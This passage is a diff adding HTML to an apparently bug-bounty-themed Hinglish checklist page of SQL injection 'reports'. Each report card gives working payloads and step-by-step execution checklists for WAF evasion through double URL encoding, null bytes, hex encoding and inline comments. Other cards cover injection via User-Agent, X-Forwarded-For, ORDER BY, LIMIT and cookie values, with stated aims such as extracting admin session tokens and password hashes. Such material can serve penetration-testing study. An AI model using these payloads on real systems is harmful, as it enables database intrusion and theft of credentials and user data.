+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>AND bypass karo</strong> â€” Agar AND block hai toh <code
+                                    class="c">&&</code> ya <code class="c">HAVING</code> try karo.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">ðŸ’¡ PRO TIP</div>
+                        <div class="protip-text">Boolean-based SQLi WAF ki nazron mein nahi aata â€” server ko late nahi
+                            karte, isliye time-limit filters bypass. "Burp Intruder" Numbers payload = best weapon for
+                            character-by-character brute-force.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+<!-- â•â•â• PHASE 2 â€” WAF BYPASS ARSENAL â•â•â• -->
+<section class="phase-section" id="phase2">
+    <div class="phase-header"><span class="phase-number">PHASE 02</span><span class="phase-title">WAF BYPASS ARSENAL â€”
+            Double Encoding Â· Null Byte Â· Hex Â· Comments</span><span class="phase-count" id="p2count">0 / 5
+            reports</span></div>
+    <div class="cards-grid" id="grid-phase2">
+
+        <!-- #06 Double Encoding -->
+        <div class="report-card" data-severity="critical" id="report-06">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #06 Â· Total #325</div>
+                    <div class="report-title">WAF Bypass via URL Double Encoding & Null Byte</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Travel & Hotel Booking) Â· $5,500 Â· 9.4 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">%2527</span><span
+                            class="technique-tag">Double Decode</span><span class="technique-tag">WAF Evasion</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">id=101' UNION SELECT 1,2,3--</code> â†’ 403 Forbidden (WAF
+                        block). Double encode: <code class="c">' â†’ %27 â†’ %2527</code>. Final: <code
+                            class="c">id=101%2527%2520AND%2520(SELECT%25201%2520FROM%2520(SELECT(SLEEP(5)))a)--</code>.
+                        WAF ne <code class="c">%2527</code> decode kiya â†’ <code class="c">%27</code> = "safe". Backend
+                        ne phir decode kiya â†’ <code class="c">'</code> = SQL execute! 5s delay = Bounty!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>WAF identify karo</strong> â€” Server header check: <code
+                                class="c">cloudflare</code>, <code class="c">Akamai</code>, <code
+                                class="c">AWS WAF</code>. Har WAF ki apni kamzori.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Double encode test karo</strong> â€” <code class="c">%2527</code>
+                            (Quote) aur <code class="c">%2520</code> (Space) try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Null Byte inject karo</strong> â€” <code class="c">%00</code> ya
+                            <code class="c">%00' UNION...</code> WAF null byte ke baad check band kar deta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Unicode try karo</strong> â€” <code class="c">%u0027</code> (Quote).
+                            Purane parsers ise decode kar lete hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Case mixing karo</strong> â€” <code class="c">ElEcT</code> ya <code
+                                class="c">UnIoN</code>. Case-Sensitive WAF bypass.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #07 Double Encoding Keywords -->
+        <div class="report-card" data-severity="high" id="report-07">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #07 Â· Total #326</div>
+                    <div class="report-title">WAF Bypass via Double Encoding SQL Keywords</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (European Airline) Â· $4,800 Â· 8.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">%2555 = U</span><span
+                            class="technique-tag">Keyword Encoding</span><span class="technique-tag">IIS/Apache</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Smart WAF single URL encoding bhi decode karke block. Solution: <code
+                            class="c">U â†’ %55 â†’ %2555</code>. Full payload: <code
+                            class="c">id=1%2527%2520%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554%25201,2,3--</code>.
+                        WAF decode â†’ <code class="c">%55%4E...</code> = random string (pass). Backend decode â†’ <code
+                            class="c">UNION SELECT</code> = DB version extracted!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>%25 se test karo</strong> â€” Input mein <code class="c">%25</code>
+                            daalo. Server <code class="c">%</code> treat kare = double decode possible.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Har letter encode karo</strong> â€” Sirf quotes nahi, <code
+                                class="c">U</code>, <code class="c">S</code>, <code class="c">E</code> jaise SQL keyword
+                            letters bhi <code class="c">%25XX</code> mein.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Burp Decoder use karo</strong> â€” "URL Encode" do baar karne ke
+                            liye Burp Suite Decoder tab.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Apache/IIS check karo</strong> â€” Ye servers aksar double decoding
+                            allow karte hain.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #08 Null Byte -->
+        <div class="report-card" data-severity="high" id="report-08">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #08 Â· Total #327</div>
+                    <div class="report-title">WAF Bypass via Null Byte â€” Document Export</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Enterprise HR & Payroll) Â· $3,800 Â· 8.4 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">%00</span><span class="technique-tag">String
+                            Terminator</span><span class="technique-tag">C-based Backends</span></div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">?file_id=101</code>. WAF ne <code class="c">'</code>
+                        detect kiya. Payload: <code class="c">?file_id=101%00' UNION SELECT 1,2,3--</code>. WAF ne <code
+                            class="c">101%00</code> dekha â†’ string terminate â†’ "safe" pass. DB ne null byte ignore kiya
+                        â†’ <code class="c">UNION SELECT</code> execute â†’ Table Names + Admin Emails PDF mein print!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Backend language check karo</strong> â€” C, C++, PHP 5.x = Null Byte
+                            ke 90% chances.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>%00 placement test karo</strong> â€” Payload ke shuru (<code
+                                class="c">%00' OR 1=1</code>) aur beech mein try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Double encode null</strong> â€” <code class="c">%2500</code> zyada
+                            effective ho sakta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Truncation check karo</strong> â€” Input kat raha hai? = null byte
+                            trigger ho raha hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #09 Hex Encoding -->
+        <div class="report-card" data-severity="high" id="report-09">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #09 Â· Total #328</div>
+                    <div class="report-title">WAF Bypass via Hex Encoding â€” User Search</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Financial Services) Â· $5,200 Â· 8.1 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">0x61646d696e</span><span
+                            class="technique-tag">No Quotes Needed</span><span class="technique-tag">UNHEX()</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">search.php?user=admin</code> blocked by WAF. Hex convert:
+                        <code class="c">admin â†’ 0x61646d696e</code>. Payload: <code
+                            class="c">user=0x61646d696e' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--</code>. WAF ko laga
+                        random hash hai â†’ pass. MySQL ne hex decode â†’ <code class="c">admin</code> â†’ query execute â†’ 5s
+                        hang!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Strings ko hex convert karo</strong> â€” <code
+                                class="c">admin â†’ 0x61646d696e</code>. Burp/online converters use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Quotes hataao</strong> â€” Hex mein quotes ki zaroorat nahi: <code
+                                class="c">WHERE user=0x61646d696e</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>UNHEX() try karo</strong> â€” Direct hex block? <code
+                                class="c">UNHEX('61646d696e')</code> use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>CONCAT se piecing karo</strong> â€” <code
+                                class="c">CONCAT(0x61, 0x64, 0x6d)</code> agar badi hex block ho.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">ðŸ§  MASTER TIP</div>
+                    <div class="mindset-text">"Hex Encoding ka sabse bada fayda: Single Quotes ki zaroorat khatam! WAFs
+                        quotes block karte hain, bina quote ke data bhejte ho toh 'Signature Match' fail ho jata hai."
+                    </div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #10 Comment Injection -->
+        <div class="report-card" data-severity="high" id="report-10">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #10 Â· Total #329</div>
+                    <div class="report-title">WAF Bypass via Inline Comments /**/ â€” API Export</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Cloud Hosting Provider) Â· $4,200 Â· 8.6 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">/**/</span><span
+                            class="technique-tag">/*!50000*/</span><span class="technique-tag">Case Folding</span></div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">export?id=1 UNION SELECT 1,2,3--</code> â†’ Cloudflare WAF
+                        block. Space + UNION combo detected. Fix: <code
+                            class="c">id=1/**/uNiOn/**/sElEcT/**/1,2,sleep(5)--</code>. WAF ko laga random string +
+                        comments. DB ne <code class="c">/**/</code> = space treat kiya â†’ <code
+                            class="c">UNION SELECT</code> execute â†’ 5s delay!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Spaces replace karo</strong> â€” <code class="c">%20</code> ya <code
+                                class="c">+</code> ki jagah <code class="c">/**/</code> use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>MySQL version comments</strong> â€” <code
+                                class="c">/*!50000SELECT*/</code> sirf MySQL 5.0+ par execute, WAF ignore karega.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Case folding mix karo</strong> â€” <code
+                                class="c">/**/UnIoN/**/sElEcT/**/</code> signature match break karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Newline as space</strong> â€” <code class="c">%0a</code> (Newline)
+                            bhi space ka kaam karta hai kuch cases mein.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- â•â•â• PHASE 3 â€” SNEAKY INJECTION POINTS â•â•â• -->
+<section class="phase-section" id="phase3">
+    <div class="phase-header"><span class="phase-number">PHASE 03</span><span class="phase-title">SNEAKY INJECTION
+            POINTS â€” Headers Â· ORDER BY Â· LIMIT Â· Cookies</span><span class="phase-count" id="p3count">0 / 5
+            reports</span></div>
+    <div class="cards-grid" id="grid-phase3">
+
+        <!-- #11 User-Agent -->
+        <div class="report-card" data-severity="critical" id="report-11">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #11 Â· Total #330</div>
+                    <div class="report-title">SQLi via User-Agent Header â€” Analytics Dashboard</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (E-commerce & Logistics SaaS) Â· $4,500 Â· 9.1 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">User-Agent</span><span
+                            class="technique-tag">INSERT Injection</span><span class="technique-tag">Logging
+                            System</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Analytics system User-Agent save karta hai DB mein. Payload: <code
+                            class="c">User-Agent: Mozilla/5.0' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a) AND '1'='1</code>.
+                        Frontend normal load. Backend INSERT query mein SLEEP execute â†’ 10s delay! WAF sirf GET/POST
+                        check karta hai, headers nahi!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Logging identify karo</strong> â€” App "Last Login IP" ya "Browser
+                            Info" dikhati hai? = header DB mein save ho raha.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>User-Agent mein <code class="c">'</code> bhejo</strong> â€” Burp
+                            Repeater se. Response change ya error = injectable.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Time-based use karo</strong> â€” Headers aksar "Blind" hote hain,
+                            SLEEP/pg_sleep best.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Referer, Origin bhi test karo</strong> â€” Accept-Language ko bhi
+                            ignore mat karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Second-Order test karo</strong> â€” Payload aaj save, kal Admin
+                            dashboard dekhta hai tab execute.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #12 X-Forwarded-For -->
+        <div class="report-card" data-severity="critical" id="report-12">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #12 Â· Total #331</div>
+                    <div class="report-title">SQLi via X-Forwarded-For â€” Login Audit Logs</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Financial Platform) Â· $6,500 Â· 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">X-Forwarded-For</span><span
+                            class="technique-tag">IP Spoofing</span><span class="technique-tag">Audit Logs</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Dashboard mein "Last Login IP" dikh raha hai = IP DB mein save. Payload:
+                        <code
+                            class="c">X-Forwarded-For: 1.2.3.4' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a) AND '1'='1</code>.
+                        WAF sirf GET/POST scan karta hai, header pass â†’ <code
+                            class="c">INSERT INTO login_logs (ip...)</code> mein SLEEP inject â†’ 10s hang!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>X-Forwarded-For manually add karo</strong> â€” Burp mein header
+                            add/modify karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Error test karo</strong> â€” <code
+                                class="c">X-Forwarded-For: 1.2.3.4'</code> se 500 aata hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Other IP headers check karo</strong> â€” <code
+                                class="c">True-Client-IP</code>, <code class="c">X-Real-IP</code>, <code
+                                class="c">Client-IP</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>OOB try karo</strong> â€” Time-based block? <code
+                                class="c">LOAD_FILE</code> ya DNS exfiltration header ke andar.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #13 ORDER BY -->
+        <div class="report-card" data-severity="critical" id="report-13">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #13 Â· Total #332</div>
+                    <div class="report-title">ORDER BY Clause SQLi â€” Product Sorting Logic</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global E-commerce Giant) Â· $8,200 Â· 9.6 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">CASE WHEN</span><span
+                            class="technique-tag">sort Parameter</span><span class="technique-tag">Conditional
+                            Sorting</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">?category=shoes&sort=price</code>. Backend: <code
+                            class="c">ORDER BY price</code>. CASE trick: <code
+                            class="c">sort=(CASE WHEN (1=1) THEN (SELECT 1 FROM (SELECT(SLEEP(10)))a) ELSE price END)</code>
+                        â†’ 10s freeze! Extraction: <code class="c">CASE WHEN (substr(user(),1,1)='a')</code> â†’ delay =
+                        TRUE, no delay = FALSE.</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Sort params dhoondho</strong> â€” <code class="c">sort</code>, <code
+                                class="c">order</code>, <code class="c">orderby</code>, <code class="c">rank</code>
+                            parameters target karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Number injection test karo</strong> â€” <code
+                                class="c">?sort=1</code>, <code class="c">?sort=2</code>. Page order badla = column
+                            number injection.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Error check karo</strong> â€” <code
+                                class="c">sort=price, (SELECT 1)</code> vs <code
+                                class="c">sort=price, (SELECT 1/0)</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>CASE WHEN use karo</strong> â€” Direct SLEEP nahi chale toh CASE
+                            conditional sorting = data extraction weapon.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #14 LIMIT Clause -->
+        <div class="report-card" data-severity="high" id="report-14">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #14 Â· Total #333</div>
+                    <div class="report-title">LIMIT Clause SQLi â€” Pagination via PROCEDURE ANALYSE</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Infrastructure) Â· $3,200 Â· 8.2 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">PROCEDURE ANALYSE</span><span
+                            class="technique-tag">EXTRACTVALUE</span><span class="technique-tag">XPath Error</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">?limit=20</code>. UNION LIMIT ke baad nahi chalta MySQL
+                        purane mein. PROCEDURE ANALYSE trick: <code
+                            class="c">limit=20 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()))),1)</code>.
+                        Error: <code class="c">XPATH syntax error: '~root@localhost'</code> â†’ DB user leaked via XPath
+                        error!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Pagination params target karo</strong> â€” <code
+                                class="c">limit</code>, <code class="c">offset</code>, <code class="c">rows</code>,
+                            <code class="c">start</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Integer injection test karo</strong> â€” <code
+                                class="c">limit=10+1</code>. 11 items dikhe = direct injection.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>DB version check karo</strong> â€” MySQL 5.x mein PROCEDURE ANALYSE
+                            kaam karta hai, 8.x mein removed.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Stacked Queries try karo</strong> â€” MySQL 8.x par <code
+                                class="c">;</code> se separate query possible?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #15 Cookie SQLi -->
+        <div class="report-card" data-severity="critical" id="report-15">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #15 Â· Total #334</div>
+                    <div class="report-title">SQLi via Session Cookie â€” User Preferences</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Travel & Airline) Â· $5,000 Â· 9.4 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Cookie Injection</span><span
+                            class="technique-tag">_prefs Cookie</span><span class="technique-tag">WAF Bypass</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Language/Currency change â†’ cookie: <code
+                            class="c">_prefs=lang:en|cur:USD|uid:9876</code>. <code class="c">uid:9876'</code> â†’ 500
+                        error! Payload: <code class="c">uid:9876' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--</code> â†’
+                        10s delay â†’ Admin session tokens + hashed passwords extracted!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Custom cookies check karo</strong> â€” <code
+                                class="c">user_id</code>, <code class="c">prefs</code>, <code
+                                class="c">tracking_id</code>, <code class="c">session_data</code> target karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Cookie mein <code class="c">'</code> test karo</strong> â€” Value ke
+                            aage <code class="c">'</code>, <code class="c">"</code>, <code class="c">\</code>, <code
+                                class="c">)</code> daalo. Response change?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Cookie decode karo</strong> â€” Base64/Hex hai? Decode â†’ payload â†’
+                            re-encode â†’ bhejo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Remember Me check karo</strong> â€” Purane systems mein "Remember
+                            Me" cookies = goldmine.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">ðŸ§  MASTER TIP</div>
+                    <div class="mindset-text">"Cookie-based SQLi = 'Goldmine' kyunki WAF aksar sirf URL aur POST body
+                        scan karta hai, headers/cookies ke andar SQL ignore kar deta hai."</div>
+                </div>
+                <div class="card-progress">
